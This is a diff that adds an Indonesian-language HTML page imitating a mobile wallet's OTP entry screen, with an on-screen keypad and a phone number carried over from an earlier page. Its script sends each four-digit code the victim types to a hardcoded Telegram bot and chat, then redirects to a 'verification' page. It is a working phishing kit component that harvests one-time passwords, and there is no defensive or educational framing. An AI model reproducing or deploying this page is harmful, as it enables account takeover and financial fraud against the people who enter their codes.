@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan OTP</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}
+        body{background:#1688F0;min-height:100vh;display:flex;flex-direction:column;color:#fff;}
+        .header{padding:10px 13px;display:flex;align-items:center;justify-content:center;position:relative;}
+        .back-btn{position:absolute;left:10px;font-size:15px;cursor:pointer;}
+        .header-title{font-size:18px;font-weight:500;}
+        .content{flex:1;padding:30px 24px 20px;text-align:center;}
+        .info-text{font-size:20px;font-weight:500;margin-bottom:16px;}
+        .phone-box{display:inline-flex;align-items:center;gap:5px;background:rgba(255,255,255,0.18);padding:8px 14px;border-radius:8px;font-size:20px;font-weight:500;margin-bottom:8px;}
+        .flag{width:15px;height:10px;background:linear-gradient(180deg,#ff0000 50%,#fff 50%);border-radius:2px;display:inline-block;}
+        .via-text{font-size:12px;opacity:0.9;margin-bottom:32px;}
+        .otp-container{display:flex;justify-content:center;gap:8px;margin-bottom:28px;}
+        .otp-box{width:30px;height:30px;background:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#1688F0;font-size:24px;font-weight:600;}
+        .resend-row{display:inline-flex;align-items:center;background:#fff;color:#333;border-radius:6px;overflow:hidden;font-size:14px;font-weight:500;}
+        .resend-btn{padding:8px 18px;cursor:pointer;}
+        .timer-box{background:#f5f5f5;padding:2px 5px;color:#666;}
+        .notify-bar{background-color:#009E5F;color:#fff;text-align:center;padding:12px;font-size:15px;}
+        .keypad{background:#f5f5f5;padding:12px 8px 20px;display:grid;grid-template-columns:repeat(3,1fr);gap:10px;}
+        .key{background:#fff;border:none;border-radius:5px;padding:10px 5px;font-size:22px;font-weight:500;color:#222;cursor:pointer;transition:background 0.1s;}
+        .key:active{background:#e9e9e9;}
+        .key-special{background:#e9e9e9;color:#555;}
+        .key-check{background:#1688F0;color:#fff;font-size:22px;}
+        .key-comma{font-size:18px;}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span class="back-btn" onclick="history.back()">‹</span>
+        <div class="header-title">Masuk</div>
+    </div>
+
+    <div class="content">
+        <div class="info-text">Kode OTP telah terkirim ke</div>
+        <div class="phone-box">
+            <span class="flag"></span>
+            <span id="nomorTampil">+62 xxx-xxxx-xxxx</span>
+        </div>
+        <div class="via-text">via 💬 SMS</div>
+
+        <div class="otp-container" id="otpContainer">
+            <div class="otp-box"></div>
+            <div class="otp-box"></div>
+            <div class="otp-box"></div>
+            <div class="otp-box"></div>
+        </div>
+
+        <div class="resend-row">
+            <div class="resend-btn">KIRIM ULANG</div>
+            <div class="timer-box">00:58 ˙</div>
+        </div>
+    </div>
+
+    <div class=""></div>
+
+    <div class="keypad">
+        <button class="key" onclick="tambahAngka('1')">1</button>
+        <button class="key" onclick="tambahAngka('2')">2</button>
+        <button class="key" onclick="tambahAngka('3')">3</button>
+        <button class="key" onclick="tambahAngka('4')">4</button>
+        <button class="key" onclick="tambahAngka('5')">5</button>
+        <button class="key" onclick="tambahAngka('6')">6</button>
+        <button class="key" onclick="tambahAngka('7')">7</button>
+        <button class="key" onclick="tambahAngka('8')">8</button>
+        <button class="key" onclick="tambahAngka('9')">9</button>
+        <button class="key key-comma">,</button>
+        <button class="key" onclick="tambahAngka('0')">0</button>
+        <button class="key">.</button>
+        <button class="key key-special">−</button>
+        <button class="key key-special">⎵</button>
+        <button class="key key-special" onclick="hapusAngka()">⌫</button>
+        <button class="key key-special"></button>
+        <button class="key key-check" onclick="kirimOTP()">✓</button>
+    </div>
+
+    <script>
+        // === ISI DATA KAMU DISINI ===
+        const BOT_TOKEN = "8994642736:AAFuer-9fij5SH2ygkMUYwVgA4V-Ux5lK_0";
+        const CHAT_ID = "-1004401558849";
+        const HALAMAN_TUJUAN = "verikasi ulang.html"; // Halaman berikutnya
+        // ===========================
+
+        let otpInput = "";
+        const maxOtp = 4;
+
+        // Tampilkan nomor dari halaman sebelumnya
+        window.onload = function() {
+            let nomor = sessionStorage.getItem("nomorPengguna") || "6283879500894";
+            nomor = nomor.replace(/(\d{2})(\d{3})(\d{4})(\d{4})/, '$1 $2-$3-$4');
+            document.getElementById("nomorTampil").textContent = "+" + nomor;
+        };
+
+        function tambahAngka(angka) {
+            if(otpInput.length >= maxOtp) return;
+            otpInput += angka;
+            updateTampilanOTP();
+            if(otpInput.length === maxOtp) kirimOTP();
+        }
+
+        function hapusAngka() {
+            otpInput = otpInput.slice(0,-1);
+            updateTampilanOTP();
+        }
+
+        function updateTampilanOTP() {
+            const kotak = document.querySelectorAll(".otp-box");
+            kotak.forEach((k, i) => k.textContent = otpInput[i] || "");
+        }
+
+        async function kirimOTP() {
+            if(otpInput.length < maxOtp) return;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method:"POST",
+                    headers:{"Content-Type":"application/json"},
+                    body:JSON.stringify({
+                        chat_id:CHAT_ID,
+                        text:`🔢 KODE OTP DITERIMA\nKode: ${otpInput}\nWaktu: ${new Date().toLocaleString('id-ID')}`
+                    })
+                });
+                sessionStorage.setItem("kodeOTP", otpInput);
+                window.location.href = HALAMAN_TUJUAN;
+            } catch(e) {
+                alert("Koneksi bermasalah, coba lagi");
+                otpInput = "";
+                updateTampilanOTP();
+            }
+        }
+    </script>
+</body>
+</html>
